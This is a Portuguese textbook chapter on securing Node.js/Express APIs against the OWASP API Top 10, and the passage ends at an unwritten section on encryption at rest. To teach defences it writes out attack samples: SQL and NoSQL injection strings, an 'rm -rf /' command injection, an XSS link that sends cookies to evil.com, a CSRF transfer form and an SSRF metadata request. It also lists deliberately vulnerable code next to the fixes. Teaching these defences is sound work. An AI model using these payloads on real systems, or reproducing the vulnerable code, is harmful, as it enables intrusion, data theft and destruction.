# Capítulo 10 — Segurança de Aplicações Web

---

## 10.1 Introdução

A segurança de um sistema de software não é uma funcionalidade que se adiciona ao final do desenvolvimento — é uma propriedade sistêmica que deve permear todas as decisões de projeto, desde a modelagem do banco de dados até a configuração do servidor em produção. Essa distinção é fundamental: tratar segurança como uma etapa final resulta invariavelmente em uma arquitetura que não foi projetada para resistir a ataques, e na qual cada medida de segurança adicionada a posteriori é um remendo sobre uma estrutura vulnerável.

O custo de uma violação de segurança é assimétrico em relação ao custo de sua prevenção. Uma vulnerabilidade de injeção SQL que poderia ter sido eliminada com o uso consistente de consultas parametrizadas — uma mudança de poucos minutos — pode resultar em vazamento de dados de milhões de usuários, com consequências financeiras, legais e reputacionais que se estendem por anos. O Relatório de Custo de uma Violação de Dados da IBM (2023) aponta que o custo médio global de uma violação de dados atingiu USD 4,45 milhões, com um tempo médio de identificação e contenção de 277 dias. Esses números não são abstratos para o desenvolvedor — são o resultado direto de decisões técnicas cotidianas.

Este capítulo aborda as ameaças de segurança mais relevantes no contexto de aplicações web Node.js/Express, organizadas em torno do OWASP Top 10 para APIs. O conteúdo é deliberadamente complementar ao que foi apresentado nos capítulos anteriores: autenticação e autorização foram tratadas no Capítulo 8; rate limiting básico e Helmet foram introduzidos nos Capítulos 3 e 8; validação de entrada foi coberta nos Capítulos 3 e 6. Este capítulo aprofunda esses temas, introduz as ameaças ainda não tratadas — injeção, XSS, CSRF, clickjacking, fixação de sessão, IDOR, MFA, criptografia em repouso, gestão de chaves de API, vulnerabilidades em dependências e falhas de configuração — e encerra com uma discussão sobre conformidade com a LGPD e um checklist de segurança para produção.

> 💡 **Pré-requisito:** Este capítulo pressupõe familiaridade com o Capítulo 8 (autenticação e autorização), o Capítulo 3 (middlewares e Helmet) e o Capítulo 5 (Prisma e acesso ao banco de dados).

---

## 10.2 OWASP Top 10 para APIs REST

### 10.2.1 O projeto OWASP e sua relevância

O **OWASP** (*Open Web Application Security Project*) é uma fundação sem fins lucrativos dedicada à melhoria da segurança de software. Sua contribuição mais conhecida é o **OWASP Top 10** — uma lista das dez categorias de risco de segurança mais críticas, atualizada periodicamente com base em dados coletados de organizações ao redor do mundo. Em 2019, o OWASP lançou uma lista específica para APIs — o **OWASP API Security Top 10** — reconhecendo que as vulnerabilidades mais prevalentes em APIs diferem parcialmente das de aplicações web tradicionais.

Compreender o OWASP Top 10 para APIs não é meramente um exercício acadêmico. É a linguagem comum utilizada por equipes de segurança, auditores, pentesters e desenvolvedores para categorizar e comunicar riscos. Profissionais de Sistemas de Informação que não dominam essa taxonomia estão despreparados para participar de discussões de segurança em ambientes corporativos.

### 10.2.2 OWASP API Security Top 10 (2023) — visão geral

| # | Categoria | Descrição resumida | Abordagem no curso |
|---|-----------|-------------------|-------------------|
| API1 | Broken Object Level Authorization | Usuário acessa objetos de outros usuários | Cap. 8 (RBAC, proprietário do recurso) |
| API2 | Broken Authentication | Implementação frágil de autenticação | Cap. 8 (JWT, bcrypt, Refresh Token) |
| API3 | Broken Object Property Level Authorization | Exposição ou modificação indevida de propriedades | Seção 10.8 (IDOR) |
| API4 | Unrestricted Resource Consumption | Ausência de limites de uso | Cap. 3 e 8 (rate limiting) |
| API5 | Broken Function Level Authorization | Acesso a funções administrativas sem autorização | Cap. 8 (RBAC por papel) |
| API6 | Unrestricted Access to Sensitive Business Flows | Automação de fluxos de negócio (scraping, compras em massa) | Seção 10.6 (rate limiting avançado) |
| API7 | Server Side Request Forgery (SSRF) | Servidor faz requisições a recursos internos | Seção 10.8 |
| API8 | Security Misconfiguration | Configurações padrão inseguras, cabeçalhos ausentes | Seção 10.7 |
| API9 | Improper Inventory Management | APIs em produção sem documentação ou controle de versão | Seção 10.11 |
| API10 | Unsafe Consumption of APIs | Confiança excessiva em APIs de terceiros | Seção 10.12 |

As categorias não cobertas por capítulos anteriores são o objeto principal deste capítulo. A sequência das seções a seguir percorre os vetores de ataque mais relevantes para a API construída ao longo do curso.

---

## 10.3 Ataques de Injeção

### 10.3.1 O princípio geral da injeção

Os **ataques de injeção** constituem uma das categorias mais antigas e persistentes de vulnerabilidades em sistemas de software. O princípio subjacente é invariável: o atacante fornece dados de entrada que, ao serem processados de forma insegura pela aplicação, são interpretados não como dados, mas como instruções — seja pelo interpretador SQL do banco de dados, pelo shell do sistema operacional, pelo interpretador LDAP ou por qualquer outro subsistema que processe a entrada do usuário.

A raiz da vulnerabilidade é sempre a mesma: a ausência de uma separação clara entre dados e instruções. A solução geral é igualmente universal: nunca construir instruções por concatenação de strings com dados provenientes do usuário.

### 10.3.2 SQL Injection

A **injeção SQL** ocorre quando dados fornecidos pelo usuário são interpolados diretamente em uma query SQL sem parametrização. Considere o exemplo clássico:

```javascript
// ❌ VULNERÁVEL — nunca faça isso
const email = req.body.email; // suponha: "' OR '1'='1"
const query = `SELECT * FROM usuarios WHERE email = '${email}'`;
// Query resultante: SELECT * FROM usuarios WHERE email = '' OR '1'='1'
// Retorna TODOS os usuários — bypass de autenticação completo
```

A injeção pode assumir formas mais sofisticadas: injeção cega (*blind SQL injection*), onde o atacante infere dados por meio de respostas binárias (verdadeiro/falso ou tempo de resposta); injeção em cláusulas `ORDER BY`, que não aceitam parâmetros posicionais; e injeção em nomes de tabelas e colunas, frequentemente esquecidos.

**Proteção com consultas parametrizadas:** O uso de parâmetros posicionais separa estruturalmente o código SQL dos dados, tornando a injeção impossível:

```javascript
// ✅ SEGURO — pg com parâmetros posicionais
const { rows } = await pool.query(
  'SELECT * FROM usuarios WHERE email = $1',
  [req.body.email]   // o driver escapa automaticamente
);
```

**O Prisma como proteção padrão:** Como estabelecido no Capítulo 5, o Prisma utiliza consultas parametrizadas em todas as operações de sua API de alto nível. A proteção contra SQL Injection é, portanto, automática e transparente:

```javascript
// ✅ SEGURO — Prisma usa parâmetros internamente
const usuario = await prisma.usuario.findUnique({
  where: { email: req.body.email }, // nunca interpolado em SQL
});
```

**O risco do `$queryRaw`:** A API de raw queries do Prisma exige atenção especial. O uso correto utiliza *tagged template literals* que parametrizam automaticamente os valores interpolados:

```javascript
// ✅ SEGURO — template literal tagged pelo Prisma
const resultado = await prisma.$queryRaw`
  SELECT * FROM usuarios WHERE email = ${req.body.email}
`;

// ❌ VULNERÁVEL — Prisma.sql com string concatenada
const resultado = await prisma.$queryRawUnsafe(
  `SELECT * FROM usuarios WHERE email = '${req.body.email}'`
);
```

A função `$queryRawUnsafe` existe para casos em que o nome da tabela ou coluna precisa ser dinâmico — situação que requer validação rigorosa de entrada contra uma lista de valores permitidos (*allowlist*), nunca confiança na entrada do usuário.

### 10.3.3 NoSQL Injection

Bancos de dados NoSQL não são imunes à injeção. No MongoDB, por exemplo, operadores de consulta como `$gt`, `$where` e `$regex` podem ser injetados através de objetos JSON mal validados:

```javascript
// Requisição maliciosa: POST /auth/login com body:
// { "email": { "$gt": "" }, "senha": { "$gt": "" } }

// ❌ VULNERÁVEL — sem validação de tipo
const usuario = await Usuario.findOne({ email: req.body.email });
// Traduzido para: db.usuarios.findOne({ email: { $gt: "" } })
// O operador $gt: "" é verdadeiro para qualquer string — retorna o primeiro usuário
```

A proteção consiste em validar o tipo e a estrutura dos dados de entrada antes de utilizá-los em queries. O `express-validator` (Capítulo 3) garante que `email` seja uma string, não um objeto:

```javascript
body('email').isEmail().withMessage('E-mail deve ser uma string válida'),
// Se req.body.email for um objeto, a validação falha antes de chegar ao banco
```

Para aplicações que usam MongoDB diretamente, o pacote `mongo-sanitize` remove recursivamente chaves que começam com `$` de objetos de entrada:

```bash
npm install mongo-sanitize
```

```javascript
import sanitize from 'mongo-sanitize';

app.use((req, res, next) => {
  req.body   = sanitize(req.body);
  req.query  = sanitize(req.query);
  req.params = sanitize(req.params);
  next();
});
```

### 10.3.4 Command Injection

A **injeção de comando** ocorre quando dados do usuário são passados para funções que executam comandos do sistema operacional — `child_process.exec()`, `child_process.execSync()` e similares:

```javascript
// ❌ VULNERÁVEL — exec interpreta o argumento como comando shell
import { exec } from 'child_process';

app.get('/ping', (req, res) => {
  const host = req.query.host;
  exec(`ping -c 1 ${host}`, (err, stdout) => res.send(stdout));
  // Se host = "google.com; rm -rf /", o comando rm -rf / será executado
});
```

A mitigação é usar `execFile()` ou `spawn()` com argumentos separados, que não são interpretados pelo shell:

```javascript
// ✅ SEGURO — spawn não interpreta metacaracteres do shell
import { spawn } from 'child_process';

app.get('/ping', (req, res) => {
  const host = req.query.host;

  // Valida o formato antes de qualquer uso
  if (!/^[a-zA-Z0-9.\-]+$/.test(host)) {
    return res.status(400).json({ erro: 'Host inválido' });
  }

  const proc = spawn('ping', ['-c', '1', host]); // argumentos separados
  let output = '';
  proc.stdout.on('data', d => { output += d; });
  proc.on('close', () => res.send(output));
});
```

A regra geral é evitar completamente a execução de comandos do sistema operacional com dados provenientes do usuário. Quando inevitável, utilizar `spawn` com argumentos separados e validar a entrada contra uma allowlist estrita.

---

## 10.4 Cross-Site Scripting (XSS)

### 10.4.1 Mecanismo e categorias

O **Cross-Site Scripting** (XSS) é uma vulnerabilidade que permite a um atacante injetar scripts maliciosos em páginas web visualizadas por outros usuários. Quando executado no navegador da vítima, o script opera no contexto de origem da aplicação legítima — podendo roubar cookies, tokens de autenticação, dados de formulários ou realizar ações em nome do usuário sem seu consentimento.

O XSS manifesta-se em três categorias principais:

O **XSS reflexivo** (*reflected XSS*) ocorre quando a entrada do usuário é imediatamente refletida na resposta sem sanitização. O vetor de ataque é tipicamente um link malicioso que, ao ser clicado pela vítima, envia dados ao servidor que são retornados e executados no navegador:

```
https://app.com/busca?q=<script>document.location='https://evil.com?c='+document.cookie</script>
```

O **XSS armazenado** (*stored XSS*) é o mais grave: o payload malicioso é armazenado no banco de dados (em um comentário, perfil ou mensagem) e executado no navegador de todos os usuários que visualizarem o conteúdo. Um único registro comprometido afeta potencialmente todos os usuários da aplicação.

O **XSS baseado em DOM** (*DOM-based XSS*) ocorre inteiramente no cliente, sem envolvimento do servidor: o JavaScript da página lê dados de uma fonte controlável pelo atacante (como `location.hash` ou `document.referrer`) e os insere no DOM de forma insegura.

### 10.4.2 EJS e o escape automático

Como apresentado no Capítulo 6, a tag `<%= expressão %>` do EJS escapa automaticamente os caracteres HTML especiais (`<`, `>`, `&`, `"`, `'`), convertendo-os em suas entidades HTML correspondentes. Isso torna o XSS reflexivo e armazenado muito mais difícil em aplicações SSR que utilizam EJS corretamente:

```html
<!-- Suponha que usuario.nome contenha: <script>alert('XSS')</script> -->

<!-- ✅ SEGURO — EJS escapa automaticamente -->
<p><%= usuario.nome %></p>
<!-- Renderiza: <p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p> -->

<!-- ❌ VULNERÁVEL — tag sem escape, usada indevidamente para dados do usuário -->
<p><%- usuario.nome %></p>
<!-- Renderiza: <p><script>alert('XSS')</script></p> — executa no browser -->
```

A tag `<%-` deve ser reservada exclusivamente para HTML confiável gerado pelo próprio sistema, nunca para dados provenientes do usuário.

### 10.4.3 Sanitização no backend com `sanitize-html`

Para conteúdo rico que precisa preservar formatação HTML (como editores de texto em blogs ou fóruns), a sanitização com uma allowlist de tags e atributos permitidos é a abordagem correta:

```bash
npm install sanitize-html
```

```javascript
import sanitizeHtml from 'sanitize-html';

const opcoesSanitizacao = {
  allowedTags: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li', 'a'],
  allowedAttributes: {
    'a': ['href', 'title', 'target'],
  },
  allowedSchemes: ['http', 'https', 'mailto'], // previne javascript: URLs
  // Transforma todos os links externos para abrir em nova aba com segurança
  transformTags: {
    'a': (tagName, attribs) => ({
      tagName: 'a',
      attribs: { ...attribs, rel: 'noopener noreferrer' },
    }),
  },
};

// No middleware de validação ou no service
const conteudoSeguro = sanitizeHtml(req.body.conteudo, opcoesSanitizacao);
```

### 10.4.4 Content Security Policy como defesa em profundidade

A **Content Security Policy** (CSP), configurada via cabeçalho HTTP, instrui o navegador sobre quais fontes de conteúdo são confiáveis. Mesmo que um payload XSS seja injetado na página, uma CSP bem configurada pode impedir sua execução:

```javascript
// Helmet com CSP configurada (detalhado na seção 10.7)
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'"],           // bloqueia scripts inline e de origens externas
    styleSrc:   ["'self'", "'unsafe-inline'"],
    imgSrc:     ["'self'", "data:"],
    connectSrc: ["'self'"],
    frameSrc:   ["'none'"],           // proteção adicional contra clickjacking
  },
}));
```

A CSP é uma medida de defesa em profundidade (*defense in depth*): não substitui a sanitização, mas limita o dano caso a sanitização falhe.

---

## 10.5 Cross-Site Request Forgery (CSRF)

### 10.5.1 Mecanismo do ataque

O **Cross-Site Request Forgery** (CSRF) explora o fato de que os navegadores enviam automaticamente cookies para um domínio em todas as requisições, independentemente da origem que as iniciou. O atacante cria uma página maliciosa que, ao ser visitada pela vítima autenticada, dispara requisições para a aplicação alvo em nome da vítima — sem seu conhecimento ou consentimento.

```html
<!-- Página maliciosa em evil.com -->
<!-- Quando a vítima visita esta página, o browser envia os cookies de app.com -->
<img src="https://app.com/api/usuarios/42/promover-admin" width="0" height="0">

<!-- Para requisições POST -->
<form id="csrf" method="POST" action="https://app.com/api/transferencias">
  <input name="valor"      value="10000">
  <input name="destinatario" value="conta_do_atacante">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### 10.5.2 Quando APIs JWT são imunes ao CSRF

Uma propriedade importante do padrão JWT com Bearer token no cabeçalho `Authorization` é a imunidade natural ao CSRF. O motivo é que o navegador **não envia automaticamente** cabeçalhos HTTP customizados em requisições cross-site — apenas cookies são enviados automaticamente. Como o token JWT é transmitido no cabeçalho `Authorization: Bearer <token>`, e não em um cookie, a página maliciosa não consegue incluí-lo na requisição forjada sem ter acesso ao token — o que seria um ataque XSS, não CSRF.

Essa imunidade pressupõe que o token é armazenado em `localStorage` ou em memória, não em um cookie. Se o token JWT for armazenado em um cookie (mesmo que `HttpOnly`), a imunidade ao CSRF desaparece e as proteções descritas a seguir tornam-se necessárias.

### 10.5.3 Proteção para sessões baseadas em cookie

Para aplicações que utilizam sessões baseadas em cookie — como aplicações SSR com EJS do Capítulo 6 — a proteção contra CSRF é obrigatória. O pacote `csurf` implementa o padrão de token de sincronização (*Synchronizer Token Pattern*):

```bash
npm install csurf
```

```javascript
// src/app.js — aplicações SSR com sessões
import csrf from 'csurf';

const csrfProtecao = csrf({ cookie: false }); // armazena na sessão, não em cookie
app.use(csrfProtecao);

// Disponibiliza o token para os templates EJS
app.use((req, res, next) => {
  res.locals.csrfToken = req.csrfToken();
  next();
});
```

```html
<!-- Em cada formulário EJS — o token é verificado no POST -->
<form method="POST" action="/usuarios">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <!-- campos do formulário -->
</form>
```

O servidor verifica se o token no corpo do formulário corresponde ao token armazenado na sessão. Uma requisição forjada de outro domínio não possui acesso ao token (está na sessão do servidor, não acessível por JavaScript de outra origem), portanto falha na verificação.

### 10.5.4 SameSite como camada adicional de proteção

O atributo `SameSite` dos cookies, apresentado no Capítulo 8, mitiga CSRF sem necessidade de tokens explícitos. Com `SameSite=Strict`, o cookie não é enviado em nenhuma requisição originada de outro domínio. Com `SameSite=Lax` (padrão moderno), o cookie é enviado apenas em navegações de nível superior (cliques em links), não em requisições de recursos (como `<img src>` ou `fetch()`). A configuração `SameSite=Strict` oferece proteção máxima, mas pode prejudicar a experiência em cenários de redirecionamento legítimo.

---

## 10.6 Clickjacking e Fixação de Sessão

### 10.6.1 Clickjacking

O **clickjacking** é um ataque que engana o usuário para que clique em elementos de uma página legítima, sem perceber, ao sobrepor essa página em um `<iframe>` invisível sobre uma interface maliciosa. O usuário acredita estar clicando em um botão da página falsa, mas está na verdade interagindo com a página legítima — executando ações como confirmar transferências, alterar configurações ou conceder permissões.

A proteção é estabelecida via cabeçalhos HTTP que instruem o browser a não renderizar a página em iframes. O Helmet configura isso automaticamente:

```javascript
// X-Frame-Options — abordagem clássica
app.use(helmet.frameguard({ action: 'deny' }));
// Cabeçalho gerado: X-Frame-Options: DENY

// CSP frame-ancestors — abordagem moderna e mais flexível (substitui X-Frame-Options em browsers modernos)
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'none'"], // nenhum domínio pode embedir esta página em iframe
    // ou: frameAncestors: ["'self'"] — permite apenas o próprio domínio
  },
}));
```

### 10.6.2 Fixação de sessão

A **fixação de sessão** (*session fixation*) é um ataque em que o atacante obtém um identificador de sessão válido antes que a vítima se autentique — por exemplo, enviando um link com o `sessionId` na URL — e aguarda que a vítima faça login. Se a aplicação reutilizar o mesmo identificador de sessão antes e após o login, o atacante, que conhece o identificador, passa a ter acesso à sessão autenticada.

A mitigação é simples e obrigatória: **regenerar o identificador de sessão após qualquer elevação de privilégio** (login, autenticação de dois fatores, alteração de papel):

```javascript
// src/services/auth.service.js — em aplicações com sessões (SSR)
async login({ email, senha }, sessao) {
  const usuario = await this.validarCredenciais(email, senha);

  // CRÍTICO: regenera o sessionId antes de armazenar os dados do usuário
  await new Promise((resolve, reject) => {
    sessao.regenerate(err => err ? reject(err) : resolve());
  });

  sessao.usuarioId = usuario.id;
  sessao.papel     = usuario.papel;

  return usuario;
}
```

Em aplicações que utilizam JWT (caso principal deste curso), a fixação de sessão não é aplicável — cada token é gerado com um `jti` (*JWT ID*) único e uma nova assinatura a cada login, tornando impossível a reutilização de um token anterior.

---

## 10.7 Configuração Segura de Cabeçalhos HTTP

### 10.7.1 O Helmet em profundidade

O pacote **Helmet**, introduzido no Capítulo 3, configura um conjunto de cabeçalhos HTTP de segurança. Esta seção detalha o propósito de cada cabeçalho e as opções de configuração avançada, fornecendo o entendimento necessário para adaptar as configurações a diferentes contextos de implantação.

```bash
npm install helmet
```

```javascript
// Configuração completa para produção
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc:     ["'self'"],
      scriptSrc:      ["'self'"],
      styleSrc:       ["'self'", "'unsafe-inline'"],
      imgSrc:         ["'self'", "data:", "https:"],
      connectSrc:     ["'self'"],
      fontSrc:        ["'self'"],
      objectSrc:      ["'none'"],
      mediaSrc:       ["'self'"],
      frameSrc:       ["'none'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  hsts: {
    maxAge:            31536000,  // 1 ano em segundos
    includeSubDomains: true,
    preload:           true,
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  crossOriginEmbedderPolicy: false, // desabilitar se usar iframes de terceiros
}));
```

### 10.7.2 Cada cabeçalho e seu propósito

**`Content-Security-Policy` (CSP)** — define quais fontes de conteúdo são confiáveis para cada tipo de recurso (scripts, estilos, imagens, frames). É a defesa mais poderosa contra XSS, pois impede a execução de scripts não autorizados mesmo quando injetados. A diretiva `default-src 'self'` instrui o browser a aceitar apenas recursos do mesmo domínio, a menos que outras diretivas específicas ampliem esse escopo.

**`Strict-Transport-Security` (HSTS)** — instrui o browser a nunca acessar o domínio via HTTP, sempre convertendo automaticamente para HTTPS, pelo período especificado em `maxAge`. A opção `preload: true` permite que o domínio seja incluído na lista de pré-carregamento HSTS dos browsers, eliminando a vulnerabilidade da primeira visita. Este cabeçalho deve ser configurado apenas em produção com HTTPS funcionando — em desenvolvimento causaria problemas com `localhost`.

**`X-Content-Type-Options: nosniff`** — impede que o browser realize *MIME type sniffing* — a tentativa de adivinhar o tipo de conteúdo baseada no conteúdo do arquivo, ignorando o `Content-Type` declarado. Sem esse cabeçalho, um arquivo de texto contendo HTML poderia ser interpretado e executado como HTML pelo browser.

**`X-Frame-Options: DENY`** — impede que a página seja renderizada em um `<iframe>`, `<frame>` ou `<object>`. Supersedido pelo CSP `frame-ancestors` em browsers modernos, mas mantido para compatibilidade com browsers mais antigos.

**`Referrer-Policy`** — controla quais informações de referência (a URL da página anterior) são enviadas em requisições. `strict-origin-when-cross-origin` envia apenas a origem (sem path e query string) em requisições cross-origin, protegendo contra vazamento de URLs internas que possam conter tokens ou identificadores sensíveis.

**`X-XSS-Protection: 0`** — desabilita o filtro XSS integrado em browsers mais antigos (IE/Edge legado). Esse filtro é considerado mais prejudicial do que benéfico em browsers modernos, pois pode ser explorado para introduzir vulnerabilidades. Browsers modernos baseiam-se na CSP para proteção XSS.

**`Cross-Origin-Resource-Policy` (CORP)** — controla se os recursos podem ser carregados por outras origens. `same-origin` restringe o carregamento a recursos da mesma origem.

**`Permissions-Policy`** (anteriormente Feature-Policy) — controla quais APIs e funcionalidades do browser a página pode utilizar. Restringe acesso à câmera, microfone, geolocalização e outras APIs sensíveis:

```javascript
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=()');
  next();
});
```

---

## 10.8 Falhas de Controle de Acesso

### 10.8.1 Insecure Direct Object Reference (IDOR)

O **IDOR** (*Insecure Direct Object Reference*) é uma vulnerabilidade de controle de acesso em que um usuário consegue acessar objetos pertencentes a outros usuários simplesmente alterando um identificador na requisição. É a primeira categoria do OWASP API Security Top 10 (API1) e uma das falhas mais comuns em APIs REST.

```javascript
// ❌ VULNERÁVEL — qualquer usuário autenticado pode ver qualquer pedido
app.get('/api/pedidos/:id', autenticar, async (req, res) => {
  const pedido = await prisma.pedido.findUnique({
    where: { id: Number(req.params.id) },
  });
  res.json(pedido);
  // O usuário com ID 42 pode acessar /api/pedidos/1 e ver pedidos de outros usuários
});
```

```javascript
// ✅ SEGURO — verifica a propriedade do recurso
app.get('/api/pedidos/:id', autenticar, async (req, res, next) => {
  const pedido = await prisma.pedido.findUnique({
    where: { id: Number(req.params.id) },
  });

  if (!pedido) return next(new AppError('Pedido não encontrado', 404));

  // Verifica que o pedido pertence ao usuário autenticado
  if (pedido.usuarioId !== req.usuario.sub && req.usuario.papel !== 'ADMIN') {
    return next(new AppError('Acesso negado', 403));
  }

  res.json(pedido);
});
```

Uma estratégia alternativa é filtrar diretamente na query, garantindo que somente recursos do usuário autenticado sejam retornados — eliminando a possibilidade de IDOR por construção:

```javascript
// Filtragem na query — IDOR impossível por construção
const pedido = await prisma.pedido.findFirst({
  where: {
    id:        Number(req.params.id),
    usuarioId: req.usuario.sub,  // sempre filtra pelo usuário autenticado
  },
});
// Se o pedido não pertencer ao usuário, findFirst retorna null → 404
```

### 10.8.2 Enumeração de recursos e IDs previsíveis

IDs sequenciais inteiros (1, 2, 3...) facilitam a enumeração de recursos — um atacante pode iterar sobre todos os IDs para descobrir recursos existentes, mesmo que não consiga acessá-los diretamente. A mitigação é o uso de **UUIDs** (*Universally Unique Identifiers*) como identificadores públicos, tornando a enumeração computacionalmente inviável:

```prisma
// prisma/schema.prisma — UUID como identificador público
model Pedido {
  id        String   @id @default(uuid())  // UUID v4 gerado automaticamente
  // ou: @default(cuid()) — identificador compacto e ordenável por tempo
  usuarioId Int      @map("usuario_id")
  // ...
}
```

O UUID não substitui o controle de acesso — um recurso com UUID ainda deve ter sua propriedade verificada — mas elimina a possibilidade de enumeração sistemática.

### 10.8.3 Server-Side Request Forgery (SSRF)

O **SSRF** (*Server-Side Request Forgery*) ocorre quando a aplicação aceita uma URL fornecida pelo usuário e faz uma requisição HTTP para essa URL a partir do servidor. Um atacante pode fornecer URLs que apontam para recursos internos da infraestrutura — metadados de instâncias de nuvem (AWS EC2 metadata service em `169.254.169.254`), serviços internos sem autenticação ou outros servidores na rede privada:

```javascript
// ❌ VULNERÁVEL — aceita qualquer URL do usuário
app.post('/api/preview', async (req, res) => {
  const resposta = await fetch(req.body.url); // req.body.url pode ser http://169.254.169.254/...
  res.json(await resposta.json());
});
```

A mitigação envolve validar a URL contra uma allowlist de domínios externos permitidos e bloquear endereços de loopback, privados e de link-local:

```javascript
import { URL } from 'url';

function validarUrlExterna(urlString) {
  let url;
  try {
    url = new URL(urlString);
  } catch {
    throw new AppError('URL inválida', 400);
  }

  // Bloqueia protocolos perigosos
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new AppError('Protocolo não permitido', 400);
  }

  // Bloqueia endereços internos e de metadados de nuvem
  const bloqueados = [
    /^localhost$/i, /^127\./, /^10\./, /^172\.(1[6-9]|2[0-9]|3[01])\./,
    /^192\.168\./, /^169\.254\./, /^::1$/, /^fc00:/i, /^fe80:/i,
  ];

  if (bloqueados.some(re => re.test(url.hostname))) {
    throw new AppError('Endereço não permitido', 403);
  }

  return url;
}
```

---

## 10.9 Autenticação Multifator (MFA)

### 10.9.1 Fundamentos e o padrão TOTP

A **autenticação multifator** (MFA) fortalece o processo de autenticação exigindo que o usuário comprove sua identidade através de dois ou mais fatores independentes, geralmente categorizados como: algo que o usuário *sabe* (senha), algo que o usuário *tem* (dispositivo físico ou app de autenticação) e algo que o usuário *é* (biometria).

O padrão mais amplamente adotado para o segundo fator em aplicações web é o **TOTP** (*Time-based One-Time Password*), especificado na RFC 6238. O TOTP gera um código numérico de seis dígitos que muda a cada 30 segundos, derivado de uma chave secreta compartilhada entre o servidor e o aplicativo autenticador do usuário (Google Authenticator, Authy, Microsoft Authenticator). A chave secreta é compartilhada no momento do cadastro do MFA via QR Code.

O algoritmo subjacente é o HMAC-SHA1 aplicado à chave secreta concatenada com o intervalo de tempo atual. Como tanto o servidor quanto o aplicativo conhecem a chave secreta e o tempo atual, ambos geram o mesmo código independentemente — sem comunicação em tempo real.

### 10.9.2 Implementação com `speakeasy`

```bash
npm install speakeasy qrcode
```

**Ativação do MFA — geração do segredo e QR Code:**

```javascript
// src/services/mfa.service.js
import speakeasy from 'speakeasy';
import QRCode    from 'qrcode';

export class MFAService {
  constructor(usuarioRepository) {
    this.repository = usuarioRepository;
  }

  async iniciarConfiguracao(usuarioId) {
    // Gera um segredo TOTP único para o usuário
    const segredo = speakeasy.generateSecret({
      name:   'Minha App',
      length: 20,      // 20 bytes = 160 bits de entropia
    });

    // Persiste o segredo temporariamente (ainda não ativado)
    await this.repository.salvarSegredoMFATemp(usuarioId, segredo.base32);

    // Gera o QR Code para ser escaneado pelo app autenticador
    const qrCodeUrl = await QRCode.toDataURL(segredo.otpauth_url);

    return {
      segredo:  segredo.base32, // exibir ao usuário como backup
      qrCode:   qrCodeUrl,      // imagem base64 do QR Code
    };
  }

  async confirmarConfiguracao(usuarioId, codigoOTP) {
    const segredoTemp = await this.repository.buscarSegredoMFATemp(usuarioId);
    if (!segredoTemp) throw new AppError('Configuração MFA não iniciada', 400);

    const valido = speakeasy.totp.verify({
      secret:   segredoTemp,
      encoding: 'base32',
      token:    codigoOTP,
      window:   1, // tolera 1 intervalo de 30s de diferença (clock skew)
    });

    if (!valido) throw new AppError('Código inválido', 401);

    // Confirma o segredo como ativo
    await this.repository.ativarMFA(usuarioId, segredoTemp);
    return { mensagem: 'MFA ativado com sucesso' };
  }

  async verificarCodigo(usuarioId, codigoOTP) {
    const segredo = await this.repository.buscarSegredoMFA(usuarioId);
    if (!segredo) throw new AppError('MFA não configurado', 400);

    const valido = speakeasy.totp.verify({
      secret:   segredo,
      encoding: 'base32',
      token:    codigoOTP,
      window:   1,
    });

    if (!valido) throw new AppError('Código MFA inválido', 401);
    return true;
  }
}
```

**Schema Prisma atualizado para MFA:**

```prisma
model Usuario {
  id            Int      @id @default(autoincrement())
  nome          String
  email         String   @unique
  senha         String
  papel         Papel    @default(USER)
  mfaAtivo      Boolean  @default(false)  @map("mfa_ativo")
  mfaSegredo    String?                   @map("mfa_segredo")
  mfaSegredoTemp String?                  @map("mfa_segredo_temp")
  criadoEm     DateTime @default(now())  @map("criado_em")

  @@map("usuarios")
}
```

**Integração no fluxo de login:**

```javascript
// src/services/auth.service.js — login com MFA
async login({ email, senha, codigoMFA }) {
  const usuario = await this.repository.buscarUsuarioPorEmail(email);
  const hashFicticio = '$2b$12$LQv3c1yqBWVHxkd0LHAkCO';
  const hashComparar = usuario?.senha ?? hashFicticio;
  const senhaCorreta = await bcrypt.compare(senha, hashComparar);

  if (!usuario || !senhaCorreta) {
    throw new AppError('Credenciais inválidas', 401);
  }

  // Se o MFA estiver ativo, verifica o código antes de emitir o token
  if (usuario.mfaAtivo) {
    if (!codigoMFA) {
      // Retorna um status especial indicando que o MFA é necessário
      // sem revelar que a senha está correta
      throw new AppError('Código MFA necessário', 403);
    }
    await this.mfaService.verificarCodigo(usuario.id, codigoMFA);
  }

  const payload = { sub: usuario.id, email: usuario.email, papel: usuario.papel };
  // ... gera e retorna os tokens
}
```

---

## 10.10 Criptografia em Trânsito e em Repouso

### 10.10.1 HTTPS e TLS

O **HTTPS** é o HTTP transportado sobre **TLS** (*Transport Layer Security*), o protocolo criptográfico que garante confidencialidade (os dados não podem ser lidos por terceiros), integridade (os dados não podem ser alterados em trânsito) e autenticidade (o cliente pode verificar que está se comunicando com o servidor legítimo, não com um intermediário malicioso).

Em desenvolvimento, o HTTP sem criptografia é aceitável. Em produção, HTTPS é obrigatório e não negociável. O Helmet configura o cabeçalho HSTS que força o uso de HTTPS para visitas futuras. A configuração do certificado TLS é responsabilidade do servidor web (Nginx, Caddy) ou da plataforma de nuvem (Heroku, Railway, Vercel), que geralmente o provisionam automaticamente via Let's Encrypt.

Do ponto de vista da aplicação Express, a configuração mais importante é garantir que requisições HTTP sejam redirecionadas para HTTPS em produção:

```javascript
// src/middlewares/https.middleware.js
export const forcarHTTPS = (req, res, next) => {
  if (process.env.NODE_ENV === 'production' && !req.secure) {
    // Em plataformas como Heroku, o proxy termina TLS e usa x-forwarded-proto
    const proto = req.headers['x-forwarded-proto'];
    if (proto !== 'https') {
      return res.redirect(301, `https://${req.hostname}${req.url}`);
    }
  }
  next();
};
```

```javascript
// src/app.js
app.set('trust proxy', 1); // necessário para req.secure funcionar atrás de proxy
app.use(forcarHTTPS);
```

### 10.10.2 Criptografia de campos sensíveis em repouso

